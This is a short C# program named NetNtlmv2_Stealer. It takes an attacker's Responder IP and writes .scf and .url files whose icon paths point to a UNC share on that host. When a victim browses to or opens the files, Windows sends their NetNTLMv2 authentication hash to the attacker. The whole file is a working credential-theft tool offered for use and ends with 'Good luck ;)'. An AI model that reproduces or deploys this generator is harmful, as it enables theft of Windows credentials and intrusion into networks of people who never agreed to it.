using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace NetNtlmv2_Stealer
{
    public class Generate
    {
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("[-] Usage: <Responder IP> <Output File Name>");
            }
            else if (args.Length == 2)
            {
                var argument = new List<string>();

                foreach (var arg in args)
                {
                    argument.Add(arg);
                }
                string filename = argument[1];

                // File templates
                string scf_templ = @"[Shell]
Command=2
IconFile=\\" + argument[0] + @"\share\%USERNAME%.ico
[Taskbar]
Command=ToggleDesktop";

                string url_templ = @"[InternetShortcut]
URL=https://ired.team
WorkingDirectory=C:\Users\Public
IconFile=\\" + argument[0] + @"\%USERNAME%.icon
IconIndex=1";


                // Create files
                string pwd = Directory.GetCurrentDirectory();
                string scf = $@"{pwd}\{filename}.scf";
                string url = $@"{pwd}\{filename}.url";

                try
                {
                    using (FileStream fs = File.Create(scf))
                    {
                        byte[] scf_file = Encoding.UTF8.GetBytes(scf_templ);
                        fs.Write(scf_file, 0, scf_file.Length);
                    }

                    using (FileStream fs = File.Create(url))
                    {
                        byte[] url_file = Encoding.UTF8.GetBytes(url_templ);
                        fs.Write(url_file, 0, url_file.Length);
                    }

                    Console.WriteLine("[+] Your files have been generated! Good luck ;)");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
            else
            {
                Console.WriteLine("[-] Error.");
                Environment.Exit(0);
            }
        }
    }
}
